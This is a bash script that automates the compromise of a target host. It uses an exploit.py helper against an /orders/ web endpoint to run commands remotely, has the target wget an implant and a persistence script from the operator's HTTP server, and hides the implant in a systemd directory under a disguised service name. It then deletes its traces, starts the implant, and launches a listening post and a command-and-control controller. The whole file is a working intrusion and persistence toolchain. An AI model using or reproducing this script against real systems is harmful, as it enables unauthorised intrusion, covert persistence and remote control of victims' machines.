PORT=8000

usage() {
    echo "Usage: $0 -b BINARY_PATH -p PERSISTENCE_SCRIPT -i TARGET_IP -l LISTENING_POST -c CONTROLLER -v VENV_PATH"
    echo "  -b    Path to your implant binary"
    echo "  -p    Path to your persistence script"
    echo "  -i    IP of target"
    echo "  -l    Path to your listening post script"
    echo "  -c    Path to your controller script"
    echo "  -v    Path to your virtual environment (e.g. ./venv)"
    exit 1
}

while getopts "b:p:i:l:c:v:h" opt; do
    case "$opt" in
        b) IMPLANT_FILE="$OPTARG" ;;
        p) PERSISTENCE_SCRIPT="$OPTARG" ;;
        i) TARGET_IP="$OPTARG" ;;
        l) LISTENING_POST="$OPTARG" ;;
        c) CONTROLLER="$OPTARG" ;;
        v) VENV_PATH="$OPTARG" ;;
        h) usage ;;
        *) usage ;;
    esac
done

if [ -z "$IMPLANT_FILE" ] || [ -z "$PERSISTENCE_SCRIPT" ] || [ -z "$TARGET_IP" ] || [ -z "$LISTENING_POST" ] || [ -z "$CONTROLLER" ] || [ -z "$VENV_PATH" ]; then
    echo "[-] Missing required arguments."
    usage
fi

if [ ! -f "$VENV_PATH/bin/activate" ]; then
    echo "[-] Virtual environment not found at $VENV_PATH"
    exit 1
fi

source "$VENV_PATH/bin/activate"
PYTHON="$VENV_PATH/bin/python3"
echo "[*] Using venv python: $PYTHON"

if [[ "$OSTYPE" == "darwin"* ]]; then
    LOCAL_IP=$(ipconfig getifaddr en0)
else
    LOCAL_IP=$(hostname -I | awk '{print $1}')
fi

IMPLANT_NAME=$(basename "$IMPLANT_FILE")
PERSISTENCE_NAME=$(basename "$PERSISTENCE_SCRIPT")
INSTALL_DIR="/var/lib/systemd/catalog"

echo "[*] Starting HTTP server at $LOCAL_IP:$PORT"
$PYTHON -m http.server $PORT > /dev/null 2>&1 &
SERVER_PID=$!
sleep 2

echo "[*] Uploading implant to target..."
$PYTHON exploit.py "http://$TARGET_IP:8080/orders/" "wget http://$LOCAL_IP:$PORT/$IMPLANT_NAME"

echo "[*] Moving implant to $INSTALL_DIR..."
$PYTHON exploit.py "http://$TARGET_IP:8080/orders/" "mkdir -p $INSTALL_DIR"
$PYTHON exploit.py "http://$TARGET_IP:8080/orders/" "mv ./$IMPLANT_NAME $INSTALL_DIR/$IMPLANT_NAME"
$PYTHON exploit.py "http://$TARGET_IP:8080/orders/" "chmod +x $INSTALL_DIR/$IMPLANT_NAME"

echo "[*] Uploading persistence script to target..."
$PYTHON exploit.py "http://$TARGET_IP:8080/orders/" "wget http://$LOCAL_IP:$PORT/$PERSISTENCE_NAME"
$PYTHON exploit.py "http://$TARGET_IP:8080/orders/" "chmod +x ./$PERSISTENCE_NAME"
$PYTHON exploit.py "http://$TARGET_IP:8080/orders/" "./$PERSISTENCE_NAME -n systemd-network-helper -b $INSTALL_DIR/$IMPLANT_NAME -a network.target"
$PYTHON exploit.py "http://$TARGET_IP:8080/orders/" "rm ./$PERSISTENCE_NAME"
echo "[*] Persistence achieved, cleaning script"

echo "[*] Implant hidden at $INSTALL_DIR, stopping HTTP server..."
kill $SERVER_PID

echo "[*] Starting implant..."
$PYTHON exploit.py "http://$TARGET_IP:8080/orders/" "cd $INSTALL_DIR && ./$IMPLANT_NAME" > /dev/null 2>&1 &
echo "[*] COMPLETED"
echo "[*] IMPLANT IS RUNNING ON TARGET"

LP_DIR=$(dirname "$LISTENING_POST")
CERT="$LP_DIR/cert.pem"
KEY="$LP_DIR/key.pem"

if [ ! -f "$CERT" ] || [ ! -f "$KEY" ]; then
    echo "[*] Generating self-signed SSL certificate..."
    openssl req -x509 -newkey rsa:2048 -keyout "$KEY" -out "$CERT" -days 365 -nodes \
        -subj "/CN=localhost" > /dev/null 2>&1
    echo "[*] Cert written to $CERT"
fi

echo "[*] Starting listening post"
$PYTHON $LISTENING_POST &
sleep 3

echo "[*] Starting controller"
$PYTHON $CONTROLLER 127.0.0.1